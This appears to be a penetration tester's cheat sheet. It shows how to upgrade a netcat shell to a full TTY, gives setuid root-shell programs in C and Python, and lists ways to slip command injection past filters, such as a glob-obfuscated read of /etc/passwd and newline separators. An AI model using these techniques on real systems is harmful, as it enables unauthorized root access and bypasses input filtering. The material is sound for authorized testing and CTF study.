# Techniques

## TTY Upgrade

Given a plain shell (via `netcat` or the like), this technique will convert the shell to a full TTY with support for signals, command history, and more. Particularly useful for preventing you from killing your shell when you do Ctrl-C as part of your muscle memory. [Source](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm-256color
stty -a
stty rows <num> columns <cols>
```

## SetUID 

### C Version

If you need a basic C program that you can set the SetUID bit, use this:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
```

Compile on the target, set SetUID, and run. Can likely compile locally and move to target if no compiler available

```bash
gcc -o setuid setuid.c && chown root:root setuid && chmod u+s setuid && ls -la setuid && ./setuid
```

### Python Version

If compiling a C program is annoying, an alternative method is to SetUID the python executable. Rather than using the system one, it's better to copy the python executable on the system somewhere else, and then SetUID your temporary copy. Then, run the following:

```python
python -c 'import os,pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
```

## Command Injection Filter Evasion

If filters are stopping things like `/bin/cat` `/etc/passwd`, you can use bash expressions like `/bi?/ca?` `/et?/pas?wd` instead.

You can use `` `command` `` or `$(command)` to help with injection.

If you can't use `; & |` as separators, try injecting a raw `\n` instead (Burp helps).
